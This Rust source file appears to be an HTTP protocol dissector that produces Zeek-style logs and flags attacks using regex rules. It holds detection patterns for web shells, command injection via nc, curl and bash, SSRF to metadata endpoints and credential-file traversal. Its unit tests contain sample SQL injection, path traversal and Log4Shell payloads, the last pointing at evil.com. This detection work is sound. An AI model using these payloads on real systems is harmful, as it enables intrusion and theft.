//! ThorDissector — HTTP Protocol Dissector (Zeek-inspired)
//!
//! Extracts structured fields from raw HTTP/1.x request and response bytes.
//! Produces connection-log entries compatible with Zeek's http.log schema.
//!
//! Detects:
//!   ▸ Web shell upload signatures (eval, base64_decode in POST body)
//!   ▸ SQL injection in URI/headers
//!   ▸ Path traversal (../etc/passwd, ..%2F)
//!   ▸ XSS (script tags, javascript: URIs)
//!   ▸ RCE via SSRF, Log4Shell, Spring4Shell, Shellshock
//!   ▸ User-Agent anomalies (curl, wget, python-requests in prod)
//!   ▸ Abnormally large response bodies (data exfiltration)

use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use regex::Regex;
use std::collections::HashMap;
use once_cell::sync::Lazy;

// ─── HTTP Connection Log (Zeek http.log schema) ───────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpLog {
    pub ts: DateTime<Utc>,
    pub uid: String,
    pub src_ip: String,
    pub src_port: u16,
    pub dst_ip: String,
    pub dst_port: u16,
    pub method: String,
    pub host: String,
    pub uri: String,
    pub referrer: String,
    pub version: String,
    pub user_agent: String,
    pub request_body_len: usize,
    pub response_status_code: Option<u16>,
    pub response_body_len: usize,
    pub content_type: String,
    pub tags: Vec<String>,
    pub anomalies: Vec<HttpAnomaly>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum HttpAnomaly {
    SqlInjection,
    PathTraversal,
    Xss,
    WebShell,
    Log4ShellRce,
    Spring4ShellRce,
    Shellshock,
    SsrfAttempt,
    LargeUpload,
    SuspiciousUserAgent,
    CommandInjection,
    SensitiveFileLeak,
}

// ─── Parsed HTTP Request ──────────────────────────────────────────────────────

#[derive(Debug, Clone, Default)]
pub struct HttpRequest {
    pub method: String,
    pub uri: String,
    pub version: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
}

#[derive(Debug, Clone, Default)]
pub struct HttpResponse {
    pub version: String,
    pub status_code: u16,
    pub status_text: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
}

// ─── PCRE patterns (compiled once) ───────────────────────────────────────────

static SQL_INJECTION: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)('|\b)(union\s+select|select\s+.*\s+from|insert\s+into|drop\s+table|exec\s+xp_|1\s*=\s*1|or\s+1\s*=\s*1|and\s+1\s*=\s*1|--\s*$|;\s*drop|benchmark\s*\(|sleep\s*\()").unwrap()
});

static PATH_TRAVERSAL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?:\.\.[\\/]){2,}|(?:%2e%2e|%252e|\.\.%2f|\.\.%5c){2,}|/etc/passwd|/etc/shadow|/windows/win\.ini").unwrap()
});

static XSS_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(<script[\s>]|javascript\s*:|on(?:load|click|error|mouseover|focus)\s*=|eval\s*\(|document\.cookie|<iframe|<img[^>]+src\s*=\s*["']?javascript)"#).unwrap()
});

static WEBSHELL_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(eval\s*\(base64_decode|assert\s*\(|preg_replace\s*\([^,]+/e|system\s*\(|passthru\s*\(|shell_exec\s*\(|exec\s*\(|popen\s*\(|proc_open\s*\()").unwrap()
});

static LOG4SHELL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\$\{jndi:(ldap|rmi|dns|corba|iiop|ldaps|dnsrmi)://").unwrap()
});

static SPRING4SHELL: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"class\.module\.classLoader\.(urls|resources)|class\[.*\]\.module\.classLoader").unwrap()
});

static SHELLSHOCK: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\(\s*\)\s*\{[^}]*\}\s*;").unwrap()
});

static SSRF_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(https?://(?:169\.254\.169\.254|metadata\.google\.internal|fd00:|10\.\d+\.\d+\.\d+|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)|file://|gopher://|dict://|ftp://127\.)").unwrap()
});

static SUSPICIOUS_UA: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(sqlmap|nikto|nmap|masscan|zgrab|python-requests/|curl/|wget/|go-http-client|dirbuster|gobuster|ffuf|nuclei|metasploit|havij|acunetix|nessus|burpsuite|zap)").unwrap()
});

static CMD_INJECTION: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?:;|\||\|\||\&\&|`|\$\()\s*(?:cat|ls|id|whoami|uname|wget|curl|nc|bash|sh|python|perl|php|ruby)(?:\s|$|;|\|)").unwrap()
});

// ─── Parser ───────────────────────────────────────────────────────────────────

/// Parse raw bytes as an HTTP/1.x request.
pub fn parse_request(data: &[u8]) -> Option<HttpRequest> {
    let text = std::str::from_utf8(data).ok()?;
    let mut lines = text.splitn(2, "\r\n\r\n");
    let header_section = lines.next()?;
    let body_bytes = lines.next().map(|b| b.as_bytes().to_vec()).unwrap_or_default();

    let mut header_lines = header_section.lines();
    let request_line = header_lines.next()?;
    let parts: Vec<&str> = request_line.splitn(3, ' ').collect();
    if parts.len() < 3 { return None; }

    let method = parts[0].to_string();
    let uri = parts[1].to_string();
    let version = parts[2].trim().to_string();

    let mut headers = HashMap::new();
    for line in header_lines {
        if let Some((k, v)) = line.split_once(':') {
            headers.insert(k.trim().to_lowercase(), v.trim().to_string());
        }
    }

    Some(HttpRequest { method, uri, version, headers, body: body_bytes })
}

/// Parse raw bytes as an HTTP/1.x response.
pub fn parse_response(data: &[u8]) -> Option<HttpResponse> {
    let text = std::str::from_utf8(data).ok()?;
    let mut sections = text.splitn(2, "\r\n\r\n");
    let header_section = sections.next()?;
    let body_bytes = sections.next().map(|b| b.as_bytes().to_vec()).unwrap_or_default();

    let mut lines = header_section.lines();
    let status_line = lines.next()?;
    let parts: Vec<&str> = status_line.splitn(3, ' ').collect();
    if parts.len() < 2 { return None; }

    let version = parts[0].to_string();
    let status_code: u16 = parts[1].parse().ok()?;
    let status_text = parts.get(2).unwrap_or(&"").to_string();

    let mut headers = HashMap::new();
    for line in lines {
        if let Some((k, v)) = line.split_once(':') {
            headers.insert(k.trim().to_lowercase(), v.trim().to_string());
        }
    }

    Some(HttpResponse { version, status_code, status_text, headers, body: body_bytes })
}

// ─── Anomaly Detection ────────────────────────────────────────────────────────

/// Scan an HTTP request for attack patterns.
/// Returns all detected anomaly types.
pub fn detect_anomalies(req: &HttpRequest) -> Vec<HttpAnomaly> {
    let mut anomalies = Vec::new();

    // Build a combined scan target from URI + headers + body
    let uri_lower = req.uri.to_lowercase();
    let ua = req.headers.get("user-agent").map(|s| s.as_str()).unwrap_or("");
    let body_str = std::str::from_utf8(&req.body).unwrap_or("");
    let combined = format!("{} {} {}", req.uri, body_str, ua);

    // SQL Injection
    if SQL_INJECTION.is_match(&uri_lower) || SQL_INJECTION.is_match(body_str) {
        anomalies.push(HttpAnomaly::SqlInjection);
    }

    // Path Traversal
    if PATH_TRAVERSAL.is_match(&combined) {
        anomalies.push(HttpAnomaly::PathTraversal);
    }

    // XSS
    if XSS_PATTERN.is_match(&combined) {
        anomalies.push(HttpAnomaly::Xss);
    }

    // Web Shell (POST body only — GET with these patterns is very rare legit)
    if req.method.to_uppercase() == "POST" && WEBSHELL_PATTERN.is_match(body_str) {
        anomalies.push(HttpAnomaly::WebShell);
    }

    // Log4Shell
    if LOG4SHELL.is_match(&combined) {
        anomalies.push(HttpAnomaly::Log4ShellRce);
    }

    // Spring4Shell
    if SPRING4SHELL.is_match(&combined) {
        anomalies.push(HttpAnomaly::Spring4ShellRce);
    }

    // Shellshock (header injection)
    for v in req.headers.values() {
        if SHELLSHOCK.is_match(v) {
            anomalies.push(HttpAnomaly::Shellshock);
            break;
        }
    }

    // SSRF
    if SSRF_PATTERN.is_match(&uri_lower) || SSRF_PATTERN.is_match(body_str) {
        anomalies.push(HttpAnomaly::SsrfAttempt);
    }

    // Command Injection
    if CMD_INJECTION.is_match(&combined) {
        anomalies.push(HttpAnomaly::CommandInjection);
    }

    // Suspicious User-Agent
    if SUSPICIOUS_UA.is_match(ua) {
        anomalies.push(HttpAnomaly::SuspiciousUserAgent);
    }

    // Large Upload (> 10 MB)
    if req.body.len() > 10 * 1024 * 1024 {
        anomalies.push(HttpAnomaly::LargeUpload);
    }

    anomalies
}

/// Generate an HttpLog entry from request + optional response.
pub fn make_http_log(
    req: &HttpRequest,
    resp: Option<&HttpResponse>,
    uid: &str,
    src_ip: &str,
    src_port: u16,
    dst_ip: &str,
    dst_port: u16,
) -> HttpLog {
    let anomalies = detect_anomalies(req);
    let tags: Vec<String> = anomalies.iter().map(|a| format!("{:?}", a)).collect();

    HttpLog {
        ts: Utc::now(),
        uid: uid.to_string(),
        src_ip: src_ip.to_string(),
        src_port,
        dst_ip: dst_ip.to_string(),
        dst_port,
        method: req.method.clone(),
        host: req.headers.get("host").cloned().unwrap_or_default(),
        uri: req.uri.clone(),
        referrer: req.headers.get("referer").cloned().unwrap_or_default(),
        version: req.version.clone(),
        user_agent: req.headers.get("user-agent").cloned().unwrap_or_default(),
        request_body_len: req.body.len(),
        response_status_code: resp.map(|r| r.status_code),
        response_body_len: resp.map(|r| r.body.len()).unwrap_or(0),
        content_type: resp
            .and_then(|r| r.headers.get("content-type").cloned())
            .unwrap_or_default(),
        tags,
        anomalies,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_basic_get_request() {
        let raw = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        let req = parse_request(raw).unwrap();
        assert_eq!(req.method, "GET");
        assert_eq!(req.uri, "/index.html");
        assert_eq!(req.headers["host"], "example.com");
    }

    #[test]
    fn detect_sql_injection_in_uri() {
        let req = HttpRequest {
            method: "GET".to_string(),
            uri: "/search?q=1'+UNION+SELECT+username,password+FROM+users--".to_string(),
            version: "HTTP/1.1".to_string(),
            headers: HashMap::new(),
            body: vec![],
        };
        let anomalies = detect_anomalies(&req);
        assert!(anomalies.contains(&HttpAnomaly::SqlInjection));
    }

    #[test]
    fn detect_path_traversal() {
        let req = HttpRequest {
            method: "GET".to_string(),
            uri: "/files/../../etc/passwd".to_string(),
            version: "HTTP/1.1".to_string(),
            headers: HashMap::new(),
            body: vec![],
        };
        let anomalies = detect_anomalies(&req);
        assert!(anomalies.contains(&HttpAnomaly::PathTraversal));
    }

    #[test]
    fn detect_log4shell() {
        let req = HttpRequest {
            method: "GET".to_string(),
            uri: "/".to_string(),
            version: "HTTP/1.1".to_string(),
            headers: {
                let mut h = HashMap::new();
                h.insert("user-agent".to_string(),
                    "${jndi:ldap://evil.com/exploit}".to_string());
                h
            },
            body: b"${jndi:ldap://evil.com/}".to_vec(),
        };
        let anomalies = detect_anomalies(&req);
        assert!(anomalies.contains(&HttpAnomaly::Log4ShellRce));
    }

    #[test]
    fn detect_suspicious_user_agent() {
        let req = HttpRequest {
            method: "GET".to_string(),
            uri: "/".to_string(),
            version: "HTTP/1.1".to_string(),
            headers: {
                let mut h = HashMap::new();
                h.insert("user-agent".to_string(), "sqlmap/1.7.8#stable".to_string());
                h
            },
            body: vec![],
        };
        let anomalies = detect_anomalies(&req);
        assert!(anomalies.contains(&HttpAnomaly::SuspiciousUserAgent));
    }

    #[test]
    fn clean_request_no_anomalies() {
        let req = HttpRequest {
            method: "GET".to_string(),
            uri: "/api/users".to_string(),
            version: "HTTP/1.1".to_string(),
            headers: {
                let mut h = HashMap::new();
                h.insert("user-agent".to_string(), "Mozilla/5.0".to_string());
                h.insert("host".to_string(), "api.example.com".to_string());
                h
            },
            body: vec![],
        };
        let anomalies = detect_anomalies(&req);
        assert!(anomalies.is_empty());
    }
}
